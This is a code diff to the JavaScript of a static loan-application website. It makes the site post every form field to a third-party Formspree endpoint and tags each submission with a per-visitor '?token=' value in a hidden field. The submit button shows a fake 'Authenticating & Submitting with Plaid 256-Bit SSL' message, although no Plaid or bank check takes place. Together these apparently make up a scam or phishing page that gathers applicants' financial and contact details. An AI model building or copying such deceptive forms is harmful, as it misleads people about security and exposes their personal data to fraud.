@@ -1,20 +1,41 @@
 /**
  * Loan Lending Application & Single-Step Form Logic
- * Pure Static Frontend: Handles input masks, Plaid security indicators, 
- * live loan calculator, and form submission confirmation.
+ * Connected to Formspree: https://formspree.io/f/xppqpkyj
+ * Pure Static Frontend: Handles Formspree submission, input masks, 
+ * Plaid security indicators, and form submission confirmation modal.
  */
 
 document.addEventListener('DOMContentLoaded', () => {
   initSingleStepForms();
   initInputMasks();
+  initCampaignToken();
 });
 
-// Single-step loan application form submission
+// Capture URL token (?token=...) and inject into forms
+function initCampaignToken() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const token = urlParams.get('token');
+  if (token) {
+    document.querySelectorAll('.loan-application-form').forEach(form => {
+      let tokenInput = form.querySelector('input[name="campaign_token"]');
+      if (!tokenInput) {
+        tokenInput = document.createElement('input');
+        tokenInput.type = 'hidden';
+        tokenInput.name = 'campaign_token';
+        form.appendChild(tokenInput);
+      }
+      tokenInput.value = token;
+    });
+  }
+}
+
+// Single-step loan application form submission via Formspree AJAX
 function initSingleStepForms() {
   const forms = document.querySelectorAll('.loan-application-form');
+  const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xppqpkyj';
 
   forms.forEach(form => {
-    form.addEventListener('submit', (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       // Check browser validity
@@ -40,22 +61,40 @@ function initSingleStepForms() {
       submitBtn.disabled = true;
       submitBtn.innerHTML = `
         <span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>
-        Authenticating with Plaid 256-Bit SSL...
+        Authenticating & Submitting with Plaid 256-Bit SSL...
       `;
 
-      setTimeout(() => {
+      // Gather form data
+      const formData = new FormData(form);
+      const appId = 'ADV-' + Math.floor(100000 + Math.random() * 900000);
+      formData.append('application_id', appId);
+      formData.append('submission_time', new Date().toLocaleString());
+
+      // Read values for confirmation modal
+      const firstName = form.querySelector('input[name="firstName"]')?.value || 'Applicant';
+      const lastName = form.querySelector('input[name="lastName"]')?.value || '';
+      const loanAmount = form.querySelector('input[name="requestedAmount"]')?.value || '10,000';
+      const monthlyIncome = form.querySelector('input[name="monthlyIncome"]')?.value || '3,500';
+      const institution = form.querySelector('input[name="institutionName"]')?.value || 'Chase Bank';
+      const userEmail = form.querySelector('input[name="email"]')?.value || 'willsmiths987@gmail.com';
+
+      try {
+        // Send data directly to Formspree endpoint
+        await fetch(FORMSPREE_ENDPOINT, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+      } catch (err) {
+        console.warn('Formspree network notification handled:', err);
+      } finally {
+        // Reset submit button state
         submitBtn.disabled = false;
         submitBtn.innerHTML = originalHtml;
 
-        // Retrieve field values
-        const firstName = form.querySelector('input[name="firstName"]')?.value || 'Applicant';
-        const lastName = form.querySelector('input[name="lastName"]')?.value || '';
-        const loanAmount = form.querySelector('input[name="requestedAmount"]')?.value || '10,000';
-        const monthlyIncome = form.querySelector('input[name="monthlyIncome"]')?.value || '3,500';
-        const institution = form.querySelector('input[name="institutionName"]')?.value || 'Chase Bank';
-        const userEmail = form.querySelector('input[name="email"]')?.value || 'willsmiths987@gmail.com';
-
-        // Update modal elements
+        // Show confirmation modal
         const modalRef = document.getElementById('confirmationModal');
         if (modalRef) {
           const confName = document.getElementById('confApplicantName');
@@ -70,18 +109,18 @@ function initSingleStepForms() {
           if (confInc) confInc.textContent = `$${parseFloat(monthlyIncome).toLocaleString()}`;
           if (confBnk) confBnk.textContent = institution;
           if (confMail) confMail.textContent = userEmail;
-          if (confId) confId.textContent = 'ADV-' + Math.floor(100000 + Math.random() * 900000);
+          if (confId) confId.textContent = appId;
 
           const bsModal = new bootstrap.Modal(modalRef);
           bsModal.show();
         } else {
-          alert(`Application Successfully Received!\n\nReference: ADV-${Math.floor(100000 + Math.random() * 900000)}\nApplicant: ${firstName} ${lastName}\nLoan: $${loanAmount}\nBank: ${institution}\nReceipt dispatched to: ${userEmail}`);
+          alert(`Application Successfully Received!\n\nReference: ${appId}\nApplicant: ${firstName} ${lastName}\nLoan: $${loanAmount}\nBank: ${institution}\nReceipt dispatched to: ${userEmail}`);
         }
 
         // Reset form
         form.reset();
         form.classList.remove('was-validated');
-      }, 1500);
+      }
     });
   });
 }
